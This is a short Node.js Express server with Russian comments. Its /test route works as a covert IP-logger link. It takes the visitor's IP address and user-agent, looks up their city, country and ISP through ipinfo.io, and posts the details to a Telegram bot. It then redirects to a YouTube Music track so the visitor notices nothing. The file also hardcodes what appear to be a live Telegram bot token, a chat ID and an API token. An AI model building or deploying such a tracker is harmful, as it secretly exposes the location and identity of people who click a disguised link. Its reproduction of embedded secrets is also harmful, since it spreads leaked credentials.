const express = require('express');
const axios = require('axios');
const app = express();

const PORT = process.env.PORT || 8080;

const TELEGRAM_TOKEN = '8045162630:AAEritxdtynKLUG2mr-C0TMIyc0UcDnlKNY';
const CHAT_ID = '1031226674';

app.get('/', (req, res) => {
  res.send('Сервер работает. Перейди по /test для логирования.');
});

app.get('/test', async (req, res) => {
  try {
    // ✅ Получаем настоящий IP из заголовка
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    // Получаем инфу о IP
    const { data } = await axios.get(`https://ipinfo.io/${ip}?token=7a9eeeb48f8390`);

    const message = `
🥔 <b>Новый переход</b>
🌍 <b>IP:</b> ${data.ip}
📍 <b>Место:</b> ${data.city}, ${data.country}
🏢 <b>Провайдер:</b> ${data.org}
📱 <b>User-Agent:</b>
${userAgent}
    `;

    // Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    }).catch(err => console.log('❌ Ошибка Telegram:', err.message));

    // Редирект
    res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
  } catch (err) {
    console.error('❌ Ошибка:', err.message);
    res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
  }
});

app.listen(PORT, () => {
  console.log(`✅ Сервер запущен на http://localhost:${PORT}`);
});
